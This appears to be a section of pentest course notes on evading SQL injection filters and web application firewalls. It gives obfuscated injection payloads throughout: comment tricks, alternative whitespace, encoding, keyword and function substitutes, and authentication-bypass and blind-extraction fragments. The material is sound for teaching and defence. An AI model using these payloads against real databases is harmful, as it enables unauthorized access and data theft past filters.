<p>The human factor is, naturally, fundamental for the understanding of the application and the flow of the exploitation. That&#39;s why automated scanners must be a support mechanism for the pentester instead of be a magic wand!</p>
<hr>
<h1 id="-sqli-filter-evasion-waf-bypassing-"><strong>SQLi Filter Evasion &amp; WAF Bypassing</strong></h1>
<h2 id="-introduction-"><strong>Introduction</strong></h2>
<p>SQL Injection attacks are so evolved that, surprisingly, their goal is not only to manipulate the database or gain access to the underlying OS, but also new concerns like DoS attacks, the spread of malware, phishing, etc.</p>
<p>Obfuscating a SQL Injection vector is like playing Legos; if you know all the pieces you have and how to combine them, then you can build an amazing machine that is capable of achieving many great feats.</p>
<h2 id="-dbms-gadgets-"><strong>DBMS Gadgets</strong></h2>
<p>In this chapter, we are going to explore the available “gadgets” for the construction of an obfuscated payload.</p>
<p>We&#39;ll see how to create strings, numbers, etc.</p>
<h3 id="-comments-"><strong>Comments</strong></h3>
<p>Comments are useful to developers for clarifying particular SQL statements. They are often used for commenting a portion of code during developer testing; however, for our purposes, there are two specific use cases: commenting out the query and obfuscating portions of our code.</p>
<h4 id="-mysql-"><strong>MySQL</strong></h4>
<p>MySQL comments syntax defines 3 official comment styles in conjunction with another unofficial technique. We can see these listed in the table below:</p>
<table>
<thead>
<tr>
<th>Syntax</th>
<th>Type</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>#</code></td>
<td>Hash</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 #&#39; AND password =&#39;&#39;;</code></td>
</tr>
<tr>
<td><code>/* */</code></td>
<td>C-style</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 /*&#39; AND password =*/&#39; OR 1=1&#39;;</code></td>
</tr>
<tr>
<td><code>-- -</code></td>
<td>SQL</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 -- -&#39; AND password =&#39;&#39;;</code></td>
</tr>
<tr>
<td><code>;%00</code></td>
<td>NULL byte</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2; [NULL]&#39; AND password =&#39;&#39;;</code></td>
</tr>
</tbody>
</table>
<h5 id="-c-style-comment-"><strong>C-style Comment</strong></h5>
<p>If we look closer at the specifications, we&#39;ll see that MySQL provides a variant to <strong>C-style comments</strong>: <code>/*! MySQL-specific code */</code></p>
<p>This is not only useful in making portable code, but it is also a great <strong>obfuscation</strong> technique!</p>
<p>For example, the content of the following comment will be executed only by servers that are <strong>MySQL 5.5.30 or higher</strong>:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT </span><span class="hljs-number">1</span> <span class="hljs-comment">/*!50530 + 1 */</span>
</code></pre>
<p>So, depending on the version, we&#39;ll receive a result of either 1 or 2.</p>
<h4 id="-mssql-"><strong>MSSQL</strong></h4>
<p>Similarly to <strong>MySQL</strong>, <strong>SQL Server</strong> defines two official comment styles and like MySQL’s documentation, an unofficial one as well:</p>
<table>
<thead>
<tr>
<th>Syntax</th>
<th>Type</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/* */</code></td>
<td>C-style</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 /*&#39; AND password =*/&#39; OR 1=1&#39;;</code></td>
</tr>
<tr>
<td><code>-- -</code></td>
<td>SQL</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 -- -&#39; AND password =&#39;&#39;;</code></td>
</tr>
<tr>
<td><code>;%00</code></td>
<td>NULL byte</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2; [NULL]&#39; AND password =&#39;&#39;;</code></td>
</tr>
</tbody>
</table>
<h4 id="-oracle-"><strong>Oracle</strong></h4>
<p>In Oracle , a comment can appear between any keywords, parameters, or punctuation marks in a statement. You can include a comment in a statement in two ways:</p>
<table>
<thead>
<tr>
<th>Syntax</th>
<th>Type</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/* */</code></td>
<td>C-style</td>
<td><code>SELECT * FROM Employees where username = &#39;&#39; OR 2=2 /*&#39; AND password =*/&#39; OR 1=1&#39;;</code></td>
</tr>
<tr>
<td><code>-- -</code></td>
<td>SQL</td>
<td><code>SELECT * FROM Employers where username = &#39;&#39; OR 2=2 -- -&#39; AND password =&#39;&#39;;</code></td>
</tr>
</tbody>
</table>
<h3 id="-functions-and-operations-"><strong>Functions and Operations</strong></h3>
<p>One of the most important elements programming languages contain are operators. They are constructs which behave generally like functions, but which differ syntactically or semantically from usual functions. They are nothing more than symbols that tell the compiler to perform specific manipulations.</p>
<p>These manipulations can be asked to perform <strong>arithmetic operations</strong> (1+2, 1*2, …), logical, comparison, assignment and many other operations. Let&#39;s take a look at the main operators and why they can be useful in our evasion techniques.</p>
<h5 id="-magic-with-numbers-"><strong>Magic with Numbers</strong></h5>
<p>You know from school, that in math if we combine <strong>plus</strong> with <strong>minus</strong>, we have <strong>minus</strong>, <strong>minus</strong> to <strong>minus</strong>…It&#39;s called arithmetic. Like with numbers, SQL is the same.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> employees <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=MAGIC_HERE
</code></pre>
<p>By manipulating the plus(+) and minus(-) characters we can generate a countless list of the number 1: <code>…id=1</code>, <code>…id=--1</code>, <code>…id=-+-+1</code>, <code>…id=----2---1</code></p>
<p>We’ll also introduce <strong>Bitwise Functions</strong> here; that is, functions that performs bit arithmetic operations. For example, we can generate the number 1 as follows: <code>…id=1&amp;1</code>, <code>…id=0|1</code>, <code>…id=13^12</code>, <code>…id=8&gt;&gt;3</code>, <code>…id=~-2</code></p>
<p>We can also use <strong>Logical Operators</strong> like these: <code>…id=NOT 0</code>, <code>…id=!0</code>, <code>…id=!1+1</code>, <code>…id=1&amp;&amp;1</code>, <code>…id=1 AND 1</code>, <code>…id=!0 AND !1+1</code>, <code>…id=1 || NULL</code></p>
<p>A number can be also generated using functions that have nothing to do with numbers. For example, we can use <strong>Regular Expression Operators</strong> to match a string and then get 0 or 1, like the following: <code>…id={anything} REGEXP &#39;.*&#39;</code>, <code>…id={anything} NOT REGEXP &#39;{randomkeys}&#39;</code>, <code>…id={anything} RLIKE &#39;.*&#39;</code>, <code>…id={anything} NOT RLIKE &#39;{randomkeys}&#39;</code></p>
<p>Additionally, some <strong>Comparison Operators</strong> are useful for generating numbers as well: <code>…id=GREATEST(0,1)</code>, <code>…id=COALESCE(NULL,1)</code>, <code>…id=ISNULL(1/0)</code>, <code>…id=LEAST(2,1)</code></p>
<p>The set of <strong>Bitwise Operators</strong> are much simpler in MySQL, so we can only manipulate using <code>&amp; (AND)</code>, <code>| (OR)</code> and <code>^ (XOR)</code>. Naturally, if we want to do binary shifting, then we need to combine them.</p>
<p>While MySQL proposes only four logical operators, there are <a href="http://dev.mysql.com/doc/refman/5.7/en/subqueries.html">other operators</a> that can also be leveraged for testing the whether or not some conditions are true. In SQL Server, these are all grouped in one table Logical Operators . However, there are no short forms, so <code>&amp;&amp;</code>, <code>||</code>, etc. are not valid in this DBMS.</p>
<h3 id="-intermediary-characters-"><strong>Intermediary Characters</strong></h3>
<p>Blank spaces are useful in separating functions, operators, declarations, and so forth, basically intermediary characters. However, some non-common characters that can be used; let&#39;s see some examples.</p>
<h5 id="-universal-whitespace-chars-"><strong>Universal Whitespace Chars</strong></h5>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span>[<span class="hljs-built_in">CHAR</span>]<span class="hljs-keyword">name</span>[<span class="hljs-built_in">CHAR</span>]<span class="hljs-keyword">from</span>[<span class="hljs-built_in">CHAR</span>]employees
</code></pre>
<p>In MySQL, the &quot;UNIVERSAL&quot; characters allowed as whitespaces are:</p>
<table>
<thead>
<tr>
<th>Code</th>
<th>Unicode Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>9</td>
<td>U+0009 CHARACTER TABULATION</td>
</tr>
<tr>
<td>10</td>
<td>U+000A LINE FEED (LF)</td>
</tr>
<tr>
<td>11</td>
<td>U+000B LINE TABULATION</td>
</tr>
<tr>
<td>12</td>
<td>U+000C FORM FEED</td>
</tr>
<tr>
<td>13</td>
<td>U+000D CARRIAGE RETURN (CR)</td>
</tr>
<tr>
<td>32</td>
<td>U+0020 SPACE</td>
</tr>
</tbody>
</table>
<p>The characters we&#39;ve seen in the previous example are &quot;UNIVERSAL&quot; because they can be used everywhere in a query without breaking it. In addition, there are other characters that can be used is specific places.</p>
<h5 id="-plus-sign-"><strong>Plus Sign</strong></h5>
<p>In all the DBMSs we can use the &quot;PLUS SIGN&quot; to separate almost all the keywords except <code>FROM</code>.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span>+<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span>+<span class="hljs-keyword">name</span> <span class="hljs-keyword">LIKE</span>+<span class="hljs-string">'J%'</span>
</code></pre>
<h5 id="-other-characters-"><strong>Other Characters</strong></h5>
<p>In addition to the previous characters, in all the DBMSs we can also use <strong>Parenthesis</strong> <code>()</code>, <strong>Operators</strong>, <strong>Quotes</strong> and of course the <strong>C-style comments</strong> <code>/**/</code>.</p>
<p>Every SQL implementation has its own Reserved Words (aka Constants). Within the SQL query these words require special treatment.</p>
<p>Do you know the most well-known word? Of course, <code>SELECT</code>.</p>
<h3 id="-constants-and-variables-"><strong>Constants and Variables</strong></h3>
<p>For evasion purposes, knowing the SQL keywords is a must. This is due to the fact that they are part of the underlying language; therefore, they can be extremely useful during the generation of strings, comparisons, etc.</p>
<p>Another precious resource are system variables. Every DBMS maintains these in order to indicate its configuration. Usually these variables have a default value, and some of them can be changed dynamically at runtime.</p>
<h4 id="-keywords-"><strong>Keywords</strong></h4>
<p>The list of Reserved Words in MySQL is defined <a href="https://dev.mysql.com/doc/refman/5.5/en/keywords.html">here</a> . It&#39;s important to note that since MySQL 4.1, it is no longer possible to obfuscate these keywords.</p>
<p>Previously, in order to obfuscate the <code>SELECT</code> keyword, we could use techniques like <code>S/**/EL/**/ECT</code> combined with other creative derivatives / manipulations.</p>
<p>Since there are no eval-like functions in the more modern MySQL systems, the only way to &quot;obfuscate&quot; keywords is by manipulating upper/lower case variations like: <code>sELeCt</code>, <code>SELect</code>, etc.</p>
<h4 id="-system-variables-"><strong>System Variables</strong></h4>
<p>In addition to the online reference, if we wish to show the list of MySQL Server System Variables (in order to see the current values used by a running server), we can use the following statement:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">VARIABLES</span>;
</code></pre>
<p>Do you remember <code>@@version</code>!? The list of system variables is extremely large and if you wish to retrieve a specific value just add two @@ before the variable name.</p>
<h4 id="-user-variables-"><strong>User Variables</strong></h4>
<p>If we want to define a custom variable, then we need the following notation:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SET</span> @myvar={expression};
<span class="hljs-keyword">SET</span> @myvar:={expression};
</code></pre>
<h3 id="-strings-"><strong>Strings</strong></h3>
<p>In SQL context, another important rule is represented by Strings and that everything, except for numerical values, must be passed to a database query as a string. Naturally, strings need to be delimited in some way and respectively, these characters need to be escaped as required.</p>
<p>Let&#39;s see some techniques that are helpful in the creation, manipulation and, of course, obfuscation of strings.</p>
<h4 id="-regular-notations-"><strong>Regular Notations</strong></h4>
<p>In MySQL, to define a string we can use two types of quotes: single quote (&#39;) and double quote (&quot;).</p>
<p>Furthermore, we can also define string literals with the following character set: <code>_latin1&#39;string&#39;</code></p>
<p>The character set that can be used has approximately 40 possible values and you can use any of them preceded by an underscore character.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> _ascii<span class="hljs-symbol">'Break</span> Meʢ'
</code></pre>
<p>You can also use <strong>N&#39;literal&#39;</strong>, or <strong>n&#39;literal&#39;</strong> to create a string in the National Character Set ; see below:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> N<span class="hljs-symbol">'mystring</span>'
</code></pre>
<p>Other literal notations are Hexadecimal:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">X</span><span class="hljs-string">'4F485045'</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x4F485045</span>
</code></pre>
<p>And there is the <strong>B&#39;literal&#39;</strong> or <strong>b&#39;literal</strong> for defining Bit Literals:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">'a'</span>=B<span class="hljs-string">'1100001'</span> <span class="hljs-meta">#TRUE</span>
</code></pre>
<h4 id="-unicode-"><strong>Unicode</strong></h4>
<p>MySQL supports different collations and, of course, there is also Unicode. One of the interesting quirks of MySQL is documented here: <a href="http://dev.mysql.com/doc/refman/5.5/en/charset-collation-effect.html">Examples of the Effect of Collation</a>.</p>
<p>Here is a simple example of a Unicode select:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-symbol">'admin</span><span class="hljs-string">'='</span>ąďṁĩň' #<span class="hljs-literal">TRUE</span>
</code></pre>
<p>Now try to imagine what occurs if you are able to register the user: <code>ąďṁĩň</code> when a user <code>admin</code> already exists.</p>
<h4 id="-escaping-"><strong>Escaping</strong></h4>
<p>Usually, escaping in SQL means using a backslash before both single and double quotes; however, there are also other <a href="https://dev.mysql.com/doc/refman/8.0/en/string-literals.html">special characters used to escape</a>.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-symbol">'He</span>\<span class="hljs-symbol">'llo</span>'
<span class="hljs-keyword">SELECT</span> <span class="hljs-symbol">'He</span>\%\_llo'
</code></pre>
<p>Furthermore, to escape quotes we can use the same character two times:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">'He'</span><span class="hljs-string">'llo'</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-string">"He"</span><span class="hljs-string">"llo"</span>
</code></pre>
<p>If we try to escape a character that doesn&#39;t have a respective escaping sequence, the backslash will be ignored. Basically, MySQL allows arbitrary usage of this character inside strings:</p>
<pre><code class="lang-mysql">SELECT '<span class="hljs-symbol">\H</span><span class="hljs-symbol">\e</span><span class="hljs-symbol">\l</span><span class="hljs-symbol">\l</span><span class="hljs-symbol">\o</span>'
SELECT 'He<span class="hljs-symbol">\l</span>l<span class="hljs-symbol">\o</span>'
</code></pre>
<h4 id="-concatenation-"><strong>Concatenation</strong></h4>
<p>As an alternative, we can use the functions <code>CONCAT</code>, <code>CONCAT_WS</code> and , where the WS stands for With Separator and is the first parameter of the function:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CONCAT</span>(<span class="hljs-string">'He'</span>,<span class="hljs-string">'ll'</span>,<span class="hljs-string">'o'</span>)
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CONCAT_WS</span>(<span class="hljs-string">''</span>,<span class="hljs-string">'He'</span>,<span class="hljs-string">'ll'</span>,<span class="hljs-string">'o'</span>)
</code></pre>
<p>It is not documented, but it is possible to concatenate quoted strings by mixing comments in C-style notation:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">'He'</span><span class="hljs-comment">/**/</span><span class="hljs-string">'ll'</span><span class="hljs-comment">/**/</span><span class="hljs-string">'o'</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-comment">/**/</span><span class="hljs-comment">/**/</span><span class="hljs-string">'He'</span><span class="hljs-comment">/**/</span><span class="hljs-string">'ll'</span><span class="hljs-comment">/**/</span><span class="hljs-string">'o'</span><span class="hljs-comment">/**/</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-comment">/*!10000 'He' */</span><span class="hljs-string">'ll'</span><span class="hljs-comment">/*****/</span><span class="hljs-string">'o'</span><span class="hljs-comment">/*****/</span>
</code></pre>
<h3 id="-integers-"><strong>Integers</strong></h3>
<p>Numbers rule the world and also the filters. Typically, we use digits to represent numbers; however, there are other interesting and useful methods used during the obfuscation process.</p>
<p>A generic example that can be useful in understanding how to construct a number is using the <strong>PI</strong> function. This function returns the value of π (pi 3.141593…). We can use this result mixed with either <strong>FLOOR</strong> and obtain the value 3, or with <strong>CEIL</strong> and obtain the value 4.</p>
<p>We can continue using system functions like <code>version()</code> and obtain 5,6 or also continue to perform arithmetic operations. For example, we can do <code>ceil(pi()*3)</code> to obtain the number 10.</p>
<h3 id="-mysql-type-conversion-"><strong>MySQL Type Conversion</strong></h3>
<p>In MySQL, there is a special behavior when combining arithmetic operations with different types. It&#39;s very similar to what we already seen in previous modules with JavaScript and PHP.</p>
<p>Let&#39;s take a look at some examples.</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> ~'-<span class="hljs-number">2</span>it\<span class="hljs-symbol">'s</span> a kind <span class="hljs-keyword">of</span> magic'
</code></pre>
<h4 id="-numbers-vs-booleans-"><strong>Numbers vs Booleans</strong></h4>
<p>Something that you are probably already familiar with are the implicit type conversions when comparing Numbers to Booleans:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> … <span class="hljs-number">1</span>=<span class="hljs-literal">TRUE</span>
<span class="hljs-keyword">SELECT</span> … <span class="hljs-number">2</span>!=<span class="hljs-literal">TRUE</span>
<span class="hljs-keyword">SELECT</span> … <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">SELECT</span> … <span class="hljs-keyword">AND</span> <span class="hljs-number">1</span>
</code></pre>
<h4 id="-strings-vs-numbers-vs-booleans-"><strong>Strings vs Numbers vs Booleans</strong></h4>
<p>The same is true if we try to compare either Strings to Numbers or if we use Operators:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span> … VERSION()=<span class="hljs-number">5.5</span> #5<span class="hljs-number">.5</span><span class="hljs-number">.30</span>
<span class="hljs-keyword">SELECT</span> … @@VERSION()=<span class="hljs-number">5.5</span> #5<span class="hljs-number">.5</span><span class="hljs-number">.30</span>
<span class="hljs-keyword">SELECT</span> … (<span class="hljs-string">'type'</span>+<span class="hljs-string">'cast'</span>)=<span class="hljs-number">0</span> #True
<span class="hljs-keyword">SELECT</span> ~<span class="hljs-string">'-2it\'s a kind of magic'</span> #1
<span class="hljs-keyword">SELECT</span> -<span class="hljs-string">'-1337a kind of magic'</span><span class="hljs-number">-25</span> #1337
</code></pre>
<h4 id="-bypassing-authentication-"><strong>Bypassing Authentication</strong></h4>
<p>Now, put all of this together and try and think of some alternatives to the classic x&#39; OR 1=&#39;1 authentication bypass!</p>
<p>Our SQL playground can help you in this case!</p>
<h2 id="-bypassing-keyword-filters-"><strong>Bypassing Keyword Filters</strong></h2>
<p>The first limitation that we may encounter when dealing with a filter are restriction on keywords. SQL uses well known words; therefore, “defenders” usually simply block these values.</p>
<p>In this section, we will discuss both techniques used to obfuscate some of these keywords, and alternative methods we can use when we have confirmed others are blocked.</p>
<h3 id="-case-changing-"><strong>Case Changing</strong></h3>
<p>The simplest and weakest filters are the ones that perform case sensitive checks (IE: if the filter blocks all the <strong>SELECT</strong> and <strong>select</strong> keywords).</p>
<p><strong>SQL Keywords</strong> are case-insensitive; therefore, these types of filters can be easily bypassed by simply changing the cases of each character:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SeLeCt</span>
<span class="hljs-keyword">SEleCT</span>
<span class="hljs-params">...</span>
</code></pre>
<p>Changing each keyword manually is a real challenge, but luckily for us, <strong>sqlmap</strong> has a tampering script for this called <code>randomcase.py</code>. Basically, this script will replace each keyword character with random case value.</p>
<h3 id="-using-intermediary-characters-"><strong>Using Intermediary Characters</strong></h3>
<p>Sometimes filters use spaces to delimit a specific keyword. In this case, as discussed in the DBMS Gadget chapter, we can use both comments instead of spaces and, depending on the DBMS version, a list of the whitespace that are not matched as spaces. See the following example below:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">values</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span>…<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span>
<span class="hljs-keyword">SELECT</span>[sp]<span class="hljs-keyword">values</span>[sp]<span class="hljs-keyword">and</span>…[sp]<span class="hljs-keyword">or</span>[sp]
</code></pre>
<h3 id="-using-alternative-techniques-"><strong>Using Alternative Techniques</strong></h3>
<p>We have seen comments and valid spaces as intermediary characters, but we can also use many other alternatives:</p>
<pre><code class="lang-mysql"><span class="hljs-keyword">SELECT</span><span class="hljs-string">"values"</span><span class="hljs-keyword">from</span><span class="hljs-string">`table`</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>
<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">values</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">table</span>)<span class="hljs-keyword">where</span>(<span class="hljs-number">1</span>)
<span class="hljs-keyword">SELECT</span><span class="hljs-string">"values"</span><span class="hljs-string">``</span><span class="hljs-keyword">from</span><span class="hljs-string">`table`</span><span class="hljs-keyword">where</span>(<span class="hljs-number">1</span>)
<span class="hljs-keyword">SELECT</span>+<span class="hljs-string">"values"</span>%A0from<span class="hljs-string">`table`</span>
</code></pre>
<h3 id="-circumventing-by-encoding-"><strong>Circumventing by Encoding</strong></h3>
<p>Encoding is another handy trick we can leverage in our arsenal. It all depends on how the application processes data.</p>
<p>Remember that between you and the application, there are many layers, such as a proxy, firewall, etc. If some of these layers handle the encoding differently, there could be a possible bypass right in front of us.</p>
<h4 id="-url-encoding-"><strong>URL Encoding</strong></h4>
<p>Usually when the requests are sent through the internet via HTTP, they are URL encoded. If the filter doesn&#39;t decode the request, it is possible to bypass it by sending a character or the entire string URL-encoded. Of course, on the other side of our attack payload, the application must decode the query before process it.</p>
<h4 id="-double-url-encoding-"><strong>Double URL Encoding</strong></h4>
<p>If you encode a URL-Encoded string, then you are performing a Double URL-Encoding. Basically, this process re-encodes the percent sign with a <code>%25</code>: <code>s = %73 &gt; %2573</code></p>
<p>In this case, if the filter decodes the request the first time and applies the rules, it will not find anything dangerous. Then when the application receives the request, it will decode the contents and trigger the malicious request.</p>
<h3 id="-replaced-keywords-"><strong>Replaced Keywords</strong></h3>
<p>When regex’s are tricky, we have to find alternative methods to bypass them. Let&#39;s see some alternative keywords and techniques that can be useful during our tests.</p>
<h4 id="-booleans-and-or-"><strong>Booleans &gt; AND, OR</strong></h4>
<p>The <strong>AND</strong> and <strong>OR</strong> operators can be replaced with <strong>&amp;&amp;</strong> and <strong>||</strong> (only in <strong>MySQL</strong> and <strong>MSSQL</strong>).</p>
<pre><code class="lang-mysql">… WHERE ID=x &amp;&amp; <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
… WHERE ID=x || <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
</code></pre>
<p>If <code>&amp;&amp;</code> and <code>||</code> are filtered, then you must use <code>UNION</code>.</p>
<h4 id="-union-simple-case-"><strong>UNION &gt; simple case</strong></h4>
<p>The <strong>UNION</strong> is a “friend” to <strong>SELECT</strong>, thus you will often see filters like the above. However, as seen in previous slides, we can use many variants to elude these kind of filters:</p>
<pre><code class="lang-mysql">… UNION(<span class="hljs-keyword">SELECT</span> <span class="hljs-string">'VALUES'</span>…) &amp;&amp; …
… <span class="hljs-keyword">UNION</span> ALL <span class="hljs-keyword">SELECT</span> …
… <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">DISTINCT</span> <span class="hljs-keyword">SELECT</span> …
… <span class="hljs-comment">/*!00000 UNION*/</span><span class="hljs-comment">/*!00000 SELECT*/</span> …
</code></pre>
<p>Its trickier when the <strong>UNION</strong> is filtered as a single keyword. In this particular type of scenario, we must switch to a blind <strong>SQLi</strong> exploitation.</p>
<pre><code class="lang-mysql">… (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>)=<span class="hljs-string">'5 …</span>
</code></pre>
<h4 id="-where-group-limit-having-"><strong>WHERE, GROUP, LIMIT, HAVING</strong></h4>
<p>These keywords are useful in reducing either the number of results returned, or to select a specific entry. If the filter blocks the <strong>WHERE</strong> keyword, we can alternatively use the <strong>GROUP BY</strong> + <strong>HAVING</strong> structure:</p>
<pre><code class="lang-mysql">… <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'5 …</span>
</code></pre>
<p>If <strong>GROUP BY</strong> is filtered, then we must revert to blind SQLi. For example, we can use <strong>HAVING</strong> for selecting a substring and then compare it, as follows:</p>
<pre><code class="lang-mysql">… AND length((<span class="hljs-keyword">select</span> <span class="hljs-keyword">first</span> <span class="hljs-built_in">char</span>)=<span class="hljs-string">'a'</span>) // <span class="hljs-number">0</span>/<span class="hljs-number">1</span> &gt; <span class="hljs-literal">true</span>/<span class="hljs-literal">false</span> …
</code></pre>
<p>What about without the <strong>HAVING</strong> statement?</p>
<p>In that case, we must really turn up the brain power and leverage functions like <code>GROUP_CONCAT</code>, functions that manipulates strings, etc. Of course, all of this is blind!</p>
<h4 id="-select-"><strong>SELECT</strong></h4>
<p>Without <strong>SELECT</strong>, it&#39;s an authentic tragedy. The exploitation can vary and really depends upon the injection point.</p>
<p>If you are injecting within a <strong>WHERE</strong> clause, which is 99% of the cases, then you have to be very lucky.</p>
<p>The first option requires you to use functions that manipulate <strong>FILES</strong>, like <code>load_file</code>, in <strong>MySQL</strong>. This approach is always blind and uses a substring of the function results and then does the comparison.</p>
<p>Another option requires us to brute-force or guess the column names by appending other WHERE conditions such as: <code>… AND COLUMN IS NOT NULL …</code></p>
<p>An alternative, if you are extremely lucky, is being able to invoke the stored <code>procedure analyse()</code> This “sproc” returns juicy information about the query just executed.</p>
<h2 id="-bypassing-function-filters-"><strong>Bypassing Function Filters</strong></h2>
<p>For Bypassing Keyword Filters we have used mainly Functions, but what if these functions are filtered?</p>
<p>Let’s now unpack useful techniques and alternative functions for use in these types of scenarios.</p>
<h3 id="-building-strings-"><strong>Building Strings</strong></h3>
<p>The first scenario we are going to explore is about building strings. In the DBMS Gadget chapter, we discussed how to generate strings but, we used quotes. Building strings without quotes is a little bit tricky.</p>
<h4 id="-unhex-hex-char-ascii-ord-"><strong>UNHEX, HEX, CHAR, ASCII, ORD</strong></h4>
<p>Each DBMS provides its functions for doing this. For example, in MySQL the <code>UNHEX</code> is useful in translating hexadecimal numbers to string:</p>
<pre><code class="lang-mysql">… SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=UNHEX(<span class="hljs-number">48</span>)
… SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=UNHEX(<span class="hljs-number">4845</span>)
… SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)=UNHEX('<span class="hljs-number">48454</span>C4C4F')
… SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">0x48454C4C4F</span>
</code></pre>
<p>Furthermore, the respective <code>HEX</code> function is useful to convert to hexadecimal:</p>
<pre><code class="lang-mysql">… HEX(SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">48</span>
… HEX(SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))=<span class="hljs-number">4845</span>
… HEX(SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>))='<span class="hljs-number">48454</span>C4C4F'
</code></pre>
<p>We can also use the <code>CHAR</code> function, as seen below:</p>
<pre><code class="lang-mysql">… SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=CHAR(<span class="hljs-number">72</span>)
… SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=CHAR(<span class="hljs-number">72</span>,<span class="hljs-number">69</span>)
… SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=CONCAT(CHAR(<span class="hljs-number">72</span>),CHAR(<span class="hljs-number">69</span>))
</code></pre>
<p>There is also a set of twin functions: <code>ASCII</code> and <code>ORD</code>:</p>
<pre><code class="lang-mysql">… ASCII(SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">48</span>
… ORD(SUBSTR(USERNAME,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">48</span>
</code></pre>
<h4 id="-conv-"><strong>CONV</strong></h4>
<p>We played some with number bases in the first modules of this course. MySQL offers an interesting method in returning the string representation of a number from two bases: <code>CONV</code>.</p>
<p>The highest base we can use is <strong>36</strong>. We cannot use it for <strong>Unicode</strong> characters; however, at least we can generate a string from <code>a-zA-Z0-9</code>.</p>
<pre><code class="lang-mysql">CONV(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) <span class="hljs-comment">// 'a'</span>
CONV(<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) <span class="hljs-comment">// 'b'</span>
</code></pre>
<p>We can mix the results with <strong>upper</strong> and <strong>lower</strong> functions to retrieve the respective representation.</p>
